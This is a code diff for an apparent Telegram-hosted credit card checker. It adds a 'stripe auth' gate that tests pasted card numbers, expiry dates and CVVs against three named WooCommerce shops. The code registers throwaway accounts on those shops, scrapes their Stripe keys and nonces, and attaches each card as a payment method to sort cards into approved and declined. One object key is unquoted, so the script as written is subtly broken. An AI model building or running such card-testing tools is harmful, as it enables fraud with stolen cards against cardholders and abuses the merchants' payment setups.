@@ -182,7 +182,7 @@
 
         .results-area {
             margin-top: 10px;
-            max-height: 250px;
+            max-height: 280px;
             overflow-y: auto;
         }
 
@@ -199,12 +199,11 @@
 
         .result-item {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 12px;
-            background: #0a0a0a;
-            border-radius: 6px;
-            margin-bottom: 3px;
+            flex-direction: column;
+            padding: 10px 12px;
+            background: #0d0d0d;
+            border-radius: 8px;
+            margin-bottom: 4px;
             border-left: 2px solid #1a1a1a;
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -219,22 +218,35 @@
         .result-item.approved {
             border-left-color: #4ade80;
         }
-        .result-item.approved .status {
-            color: #4ade80;
-        }
         .result-item.declined {
             border-left-color: #f87171;
         }
-        .result-item.declined .status {
-            color: #f87171;
+
+        .result-item .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         .result-item .cc {
-            color: #555;
+            color: #666;
+            font-size: 12px;
         }
         .result-item .status {
             font-weight: 600;
             font-size: 11px;
+        }
+        .result-item.approved .status { color: #4ade80; }
+        .result-item.declined .status { color: #f87171; }
+
+        .result-item .message {
+            font-size: 11px;
+            color: #444;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            margin-top: 4px;
+            padding-top: 4px;
+            border-top: 1px solid #141414;
+            word-break: break-all;
         }
 
         .no-results {
@@ -267,10 +279,10 @@
     <div class="gate-area">
         <div class="gate-label">
             <span>gate</span>
-            <span id="gate-status" style="color:#333;">● ontraport</span>
+            <span id="gate-status" style="color:#333;">● stripe auth</span>
         </div>
         <select id="gate-select">
-            <option value="ontraport">ontraport</option>
+            <option value="stripe_auth">stripe auth</option>
         </select>
     </div>
 
@@ -329,6 +341,136 @@
     });
     document.addEventListener('contextmenu', (e) => e.preventDefault());
 
+    // ========== STRIPE AUTH ==========
+    const AUTH_SITES = [
+        'https://pathosceramiche.com',
+        'https://josephamichael.com',
+        'https://perfectible.net'
+    ];
+
+    async function stripeAuthCheck(cc) {
+        const parts = cc.split('|');
+        if (parts.length < 4) {
+            return { status: 'declined', message: '❌ Invalid format' };
+        }
+
+        const [number, month, year, cvv] = parts;
+        const pan = number.replace(/\D/g, '');
+        const expM = month.padStart(2, '0');
+        const expY = year.slice(-2);
+        const cleanCVV = cvv;
+
+        if (pan.length < 15 || pan.length > 19) {
+            return { status: 'declined', message: '❌ Invalid card number' };
+        }
+
+        const sites = [...AUTH_SITES];
+        for (let i = sites.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [sites[i], sites[j]] = [sites[j], sites[i]];
+        }
+
+        let lastError = 'all sites failed';
+        for (const site of sites) {
+            try {
+                const result = await checkCardOnSite(site, pan, expM, expY, cleanCVV);
+                return result;
+            } catch (err) {
+                lastError = err.message || 'site error';
+            }
+        }
+
+        return { status: 'declined', message: `❌ ${lastError}` };
+    }
+
+    async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
+        const addPmUrl = `${baseUrl}/my-account/add-payment-method/`;
+
+        const email = `user${Math.random().toString(36).slice(2, 10)}@gmail.com`;
+        const registerRes = await fetch(addPmUrl, {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                email: email,
+                woocommerce-register-nonce: '',
+                _wp_http_referer: '/my-account/add-payment-method/',
+                register: 'Register'
+            })
+        });
+
+        const html = await registerRes.text();
+
+        const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
+        if (!keyMatch) throw new Error('stripe key not found');
+        const stripePubKey = keyMatch[0];
+
+        let nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
+        if (!nonceMatch) {
+            nonceMatch = html.match(/createAndConfirmSetupIntentNonce["\s:]+([^"\s,]+)/);
+        }
+        if (!nonceMatch) throw new Error('nonce not found');
+        const setupIntentNonce = nonceMatch[1];
+
+        const stripeRes = await fetch('https://api.stripe.com/v1/payment_methods', {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Accept': 'application/json',
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/'
+            },
+            body: new URLSearchParams({
+                type: 'card',
+                'card[number]': pan,
+                'card[cvc]': cvv,
+                'card[exp_year]': expY,
+                'card[exp_month]': expM,
+                allow_redisplay: 'unspecified',
+                'billing_details[address][country]': 'TR',
+                key: stripePubKey,
+                _stripe_version: '2024-06-20'
+            })
+        });
+
+        const stripeData = await stripeRes.json();
+        const pmId = stripeData.id;
+        if (!pmId) {
+            const err = stripeData.error?.message || 'stripe error';
+            throw new Error(err);
+        }
+
+        const wcRes = await fetch(baseUrl, {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'x-requested-with': 'XMLHttpRequest',
+                'Origin': baseUrl,
+                'Referer': addPmUrl
+            },
+            body: new URLSearchParams({
+                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+                action: 'create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': pmId,
+                'wc-stripe-payment-type': 'card',
+                _ajax_nonce: setupIntentNonce
+            })
+        });
+
+        const wcData = await wcRes.json();
+
+        if (wcData.success === true) {
+            return { status: 'approved', message: '✅ Auth Success' };
+        }
+
+        const errMsg = wcData.data?.error?.message || wcData.data?.message || 'auth failed';
+        return { status: 'declined', message: `❌ ${errMsg}` };
+    }
+
+    // ========== CHECK ==========
     async function startCheck() {
         if (isRunning) return;
 
@@ -339,7 +481,6 @@
         }
 
         const cards = raw.split('\n').filter(l => l.trim() !== '');
-        const gate = document.getElementById('gate-select').value;
 
         isRunning = true;
         startBtn.disabled = true;
@@ -360,20 +501,16 @@
             statusMsg.textContent = `${i + 1} / ${cards.length}`;
 
             try {
-                const res = await fetch('/api/check', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cc, user_id: user.id, gate })
-                });
-                const data = await res.json();
-                const status = data.status || 'declined';
-                showResult(cc, status);
+                const result = await stripeAuthCheck(cc);
+                const status = result.status || 'declined';
+                const message = result.message || '';
+                showResult(cc, status, message);
                 if (status === 'approved') approved++;
                 else declined++;
                 live++;
                 updateStats();
-            } catch (_) {
-                showResult(cc, 'declined');
+            } catch (err) {
+                showResult(cc, 'declined', '❌ Error');
                 declined++;
                 live++;
                 updateStats();
@@ -387,13 +524,17 @@
         tg.showAlert(`done. approved: ${approved}, declined: ${declined}`);
     }
 
-    function showResult(cc, status) {
+    function showResult(cc, status, message) {
         const div = document.createElement('div');
         div.className = `result-item ${status}`;
         const masked = cc.length > 4 ? cc.slice(0, 4) + '****' + cc.slice(-4) : cc;
+        const statusText = status === 'approved' ? '✓ Approved' : '✗ Declined';
         div.innerHTML = `
-            <span class="cc">${masked}</span>
-            <span class="status">${status === 'approved' ? '✓' : '✗'}</span>
+            <div class="row">
+                <span class="cc">${masked}</span>
+                <span class="status">${statusText}</span>
+            </div>
+            <div class="message">${message || ''}</div>
         `;
         resultsContainer.appendChild(div);
         const noResult = resultsContainer.querySelector('.no-results');
